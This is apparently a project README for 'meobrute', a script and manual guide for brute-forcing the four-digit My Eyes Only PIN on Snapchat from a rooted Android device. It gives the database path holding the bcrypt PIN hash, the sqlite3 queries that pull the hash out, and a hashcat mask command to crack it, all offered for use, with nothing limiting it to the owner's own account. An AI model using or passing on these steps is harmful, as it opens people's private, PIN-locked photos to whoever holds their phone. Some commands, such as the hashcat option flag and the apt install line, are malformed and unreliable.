<h1 align="center">meobrute</h1>
<p align="center">
Automate the proccess of brute forcing the My Eyes Only pin code on Snapchat
<br>
<br>
<img src="images/preview.png">
<br>
<b> This script only works for rooted Android devices! </b>
<br>

## Dependencies
- [`adb`](https://developer.android.com/studio/command-line/adb)
- [`hashcat`](https://hashcat.net/hashcat/)

This script was tested on an Android device running Android 10 with LinageOS with Snapchat
v11.71.1.39

## How it works (_[Demo on YouTube](https://www.youtube.com/watch?v=uokcG95hqj0)_)
Snapchat saves the 4 digit My Eyes Only (MEO) pincode encrypted using [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) in `/data/data/com.snapchat.android/databases/memories.db`.

![image](images/database.png)

Once you've gotten the hash and saved it into a file (eg.`meohash.txt`), you can use `hashcat` to brute force it using the following command:
```
hashcat --attack-method 3200 --attack-mode 3 meohash.txt "?d?d?d?d"
```

## The other method
In case adb root or the running the sscript doesn't work properly then you can follow the below guide:
1. Get this file `/data/data/com.snapchat.android/databases/memories.db` from the rooted folder.
2. Move it to your pc to a new folder.
3. Open wsl ubuntu there.
4. Type `sqlite3 memories.db` and press ENTER.
5. Type `.tables` and press ENTER.
6. Copy the file name `memories_meo_confidential`.
7. Type `PRAGMA table_info(memories_meo_confidential);` and press ENTER.
8. Type `select hashed_passcode from memories_meo_confidential;` and press ENTER.
9. You will get hash of the password.
10. Type `exit`, press ENTER, press CTRL+D.
11. Copy it.
12. Type `nano meohash.txt` and press ENTER.
13. Copy paste the hash, press CTRL+O, ENTER, CTRL+X.
14. Type `hashcat --attack-method 3200 --attack-mode 3 meohash.txt "?d?d?d?d"` and press ENTER.
15. Wait sometime for the result.

## Requirements
- Rooted device.
- Name that hash `pip3 install name-that-hash` (This tool is needed to find the type of hash found).
- Adb drivers `sudo apt-install adb`.

## About Name that hash
To know about the type of hash use the following:
1. Type `nth --text "hash"` and press ENTER.
2. Remember to add `\` before all the dollar signs $.
